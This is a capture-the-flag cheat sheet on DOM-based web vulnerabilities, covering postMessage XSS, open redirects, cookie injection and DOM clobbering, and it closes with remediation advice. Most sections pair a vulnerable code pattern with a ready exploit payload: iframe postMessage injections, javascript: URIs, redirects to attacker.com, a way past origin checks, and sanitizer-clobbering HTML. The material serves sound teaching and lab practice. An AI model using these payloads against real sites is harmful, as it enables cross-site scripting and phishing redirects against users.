# DOM-Based Vulnerabilities — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, DOM Invader  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

DOM vulnerabilities happen when client-side JavaScript takes data from an untrusted **Source** and passes it unsafely to an execution **Sink**.

1. **Map Sources:** Search client scripts for `location.search`, `location.hash`, `location.pathname`, `document.referrer`, `window.name`, and `message` event listeners (`postMessage`).
2. **Trace Sinks:** Trace data flow using Burp **DOM Invader** or DevTools debugger to check if user input reaches dangerous sinks (`eval()`, `document.write()`, `innerHTML`, `location.href`, `document.cookie`).
3. **Analyze Sanitization:** Check whether characters are encoded, stripped, or validated against regexes.
4. **Identify Flaws:** Look for missing origin checks in `postMessage`, DOM clobbering targets, or unsanitized redirects.

---

## 2. Common Sources and Dangerous Sinks

| Source | Description |
|---|---|
| `location.search` | URL query string (`?param=val`) |
| `location.hash` | URL fragment (`#payload`) — often not sent to server |
| `document.referrer` | Referrer header URL |
| `window.name` | Cross-window readable storage |
| `postMessage` | Cross-origin message payload (`event.data`) |

| Category | Dangerous Sinks |
|---|---|
| **DOM XSS** | `document.write()`, `document.writeln()`, `element.innerHTML`, `element.outerHTML`, `eval()`, `setTimeout()`, `setInterval()` |
| **DOM Open Redirect** | `location`, `location.href`, `location.assign()`, `location.replace()` |
| **DOM Cookie Manipulation** | `document.cookie` |
| **DOM Document Domain** | `document.domain` |

---

## 3. Web Message (`postMessage`) Vulnerabilities

Occurs when an `addEventListener('message', ...)` listener processes incoming data without verifying `event.origin`.

### 1. Simple `postMessage` DOM XSS
- **Vulnerable Script:**
  ```javascript
  window.addEventListener('message', function(e) {
      document.getElementById('ads').innerHTML = e.data;
  });
  ```
- **Exploit Payload (Exploit Server):**
  ```html
  <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')"></iframe>
  ```

---

### 2. `postMessage` with JSON Serialization
- **Vulnerable Script:**
  ```javascript
  window.addEventListener('message', function(e) {
      var d = JSON.parse(e.data);
      if (d.type === 'load-channel') {
          document.getElementById('player').src = d.url;
      }
  });
  ```
- **Exploit Payload:**
  ```html
  <iframe src="https://TARGET.net/" onload='this.contentWindow.postMessage(JSON.stringify({"type":"load-channel","url":"javascript:print()"}), "*")'></iframe>
  ```

---

### 3. `postMessage` with Flawed Regex Origin Validation
- **Vulnerable Check:**
  ```javascript
  if (e.origin.indexOf('target.net') !== -1) { ... }
  ```
- **Bypass:** Host the exploit on `target.net.attacker.com` or `attacker-target.net`.

---

## 4. DOM Open Redirection

- **Vulnerable Pattern:**
  ```javascript
  var returnUrl = /url=(https?:\/\/.+)/.exec(location.search);
  if (returnUrl) location.href = returnUrl[1];
  ```
- **Test:** Pass an external URL or `javascript:` URI:
  ```text
  https://TARGET.net/post?url=https://attacker.com
  https://TARGET.net/post?url=//attacker.com
  https://TARGET.net/post?url=javascript:alert(document.domain)
  ```
- **Flawed Validation Bypass:** If it requires `target.net` in the URL:
  ```text
  ?url=https://attacker.com#target.net
  ?url=https://attacker.com/?target.net
  ```

---

## 5. DOM-Based Cookie Manipulation

- **Vulnerable Pattern:**
  ```javascript
  var lastPage = location.hash.slice(1);
  document.cookie = "lastPage=" + lastPage;
  ```
- **Exploit Goal:** Inject arbitrary cookie values or trigger client-side HTTP response splitting / XSS when the cookie is subsequently reflected unsafely.
  ```text
  https://TARGET.net/#fake;%20SameSite=None;%20Secure
  ```

---

## 6. DOM Clobbering

DOM Clobbering injects HTML elements with `id` or `name` attributes to override existing JavaScript variables or properties on the `window` or `document` object.

### 1. Basic Variable Clobbering
- **Vulnerable Pattern:**
  ```javascript
  let defaultAvatar = window.defaultAvatar || '/resources/images/avatarDefault.svg';
  let avatar = document.getElementById('avatar');
  avatar.src = defaultAvatar;
  ```
- **Clobbering Payload:**
  ```html
  <a id="defaultAvatar" href="javascript:alert(1)">Click</a>
  ```
  *(Browser creates `window.defaultAvatar`. Because anchor tags stringify to their `href` attribute, `avatar.src` becomes `javascript:alert(1)`).*

---

### 2. Multi-Level Property Clobbering (`window.config.url`)
To clobber two levels (e.g., `someObject.url`), use a `<form>` containing an element with a `name` attribute:
- **Vulnerable Pattern:**
  ```javascript
  let url = window.someObject.url || '/default.js';
  ```
- **Clobbering Payload:**
  ```html
  <form id="someObject">
      <a id="url" href="javascript:alert(1)"></a>
  </form>
  ```
  *(Here, `window.someObject` references the form, and `window.someObject.url` references the enclosed anchor, stringifying to `javascript:alert(1)`).*

---

### 3. Clobbering DOM Attributes to Bypass HTML Filters
- **Scenario:** An HTML sanitizer strips dangerous tags, but allows safe attributes like `id` and `name`. It relies on checking `node.attributes`:
- **Clobbering Payload:**
  ```html
  <form id="safelist" name="attributes"></form>
  ```

---

## 7. Burp DOM Invader Workflow

1. Open Burp's embedded browser.
2. Open DevTools (`F12`) → **DOM Invader** tab.
3. Turn **DOM Invader ON**, enable **Postmessage interception**, and enable **Web messages**.
4. Set a Canary (e.g., `canary123`).
5. Browse the application: DOM Invader automatically alerts when the canary flows into sinks (`innerHTML`, `eval`, `location.href`).
6. For `postMessage`, click **Auto-fire** or **Exploit** to automatically craft iframe PoCs.

---

## 8. CTF Quick Reference

| Vulnerability | Source / Pattern | Exploit Payload Pattern |
|---|---|---|
| **postMessage XSS** | `e.data` into `innerHTML` | `<iframe src="..." onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*')">` |
| **postMessage JSON** | `JSON.parse(e.data)` | `postMessage(JSON.stringify({"url":"javascript:alert(1)"}), "*")` |
| **DOM Redirect** | `location.href = param` | `?url=javascript:alert(1)` or `?url=//attacker.com` |
| **DOM Clobbering 1** | `window.avatar.src` | `<a id="avatar" href="javascript:alert(1)">` |
| **DOM Clobbering 2** | `window.config.url` | `<form id="config"><a id="url" href="javascript:alert(1)"></a></form>` |

---

## 9. Remediation

- **Verify Origin in postMessage:**
  ```javascript
  window.addEventListener('message', function(event) {
      if (event.origin !== 'https://trusted-domain.com') return;
      // Process event.data safely
  });
  ```
- **Avoid Dangerous Sinks:** Replace `innerHTML` with `textContent`. Use URL parsing APIs (`new URL()`) to validate redirect targets against origin whitelists.
- **Defend Against DOM Clobbering:** Validate variables with `typeof` checks or freeze configurations (`Object.freeze()`).
